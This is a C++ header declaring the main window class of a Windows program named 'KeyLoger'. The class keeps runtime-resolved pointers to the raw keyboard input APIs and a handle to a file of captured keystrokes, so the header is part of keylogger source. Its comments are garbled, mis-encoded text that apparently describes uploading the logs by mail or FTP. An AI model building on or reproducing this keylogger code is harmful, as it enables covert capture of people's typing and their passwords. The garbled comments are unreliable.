#ifndef MainWnd_h__
#define MainWnd_h__

#include "Utils\WinImplBase.h"

#pragma once
//�Ӽ��̼�¼�Ĺ���
//һ�������ļ��̼�¼����һ����¼�ļ��ϴ��Ĺ��ܣ����ʼ���FTP
//
typedef BOOL(_stdcall * PRegisterRawInputDevices)(PCRAWINPUTDEVICE, UINT, UINT);
typedef UINT(_stdcall * PGetRawInputData)(HRAWINPUT, UINT, LPVOID, PUINT, UINT);
class CMainWnd : public WindowImplBase
{
public:
	CMainWnd(void);
	~CMainWnd(void);

public:
	CDuiString GetSkinFolder(){ return _T(""); };
	CDuiString GetSkinFile(){ return CDuiString(_T("MainSkin.xml")); };
	LPCTSTR GetWindowClassName() const{return _T("KeyLoger");};
	LRESULT HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam);
	void InitWindow();
	void Notify(TNotifyUI& msg);

	bool OnCloseBtnClick(TNotifyUI* pTNotifyUI, LPARAM lParam, WPARAM wParam);

private:

	CButtonUI*		pCloseBtn;
	CLabelUI *		pMsgLabel;
	HANDLE			hFile;   //���ڱ����ȡ�İ�����¼���ļ��ľ��
	PGetRawInputData GetRawInputData;//���ڱ����ȡ��GetRawInputData���ڴ��ַ 
	PRegisterRawInputDevices RegisterRawInputDevices;//���ڱ����ȡ��RegisterRawInputDevices���ڴ��ַ 
};

#endif // MainWnd_h__
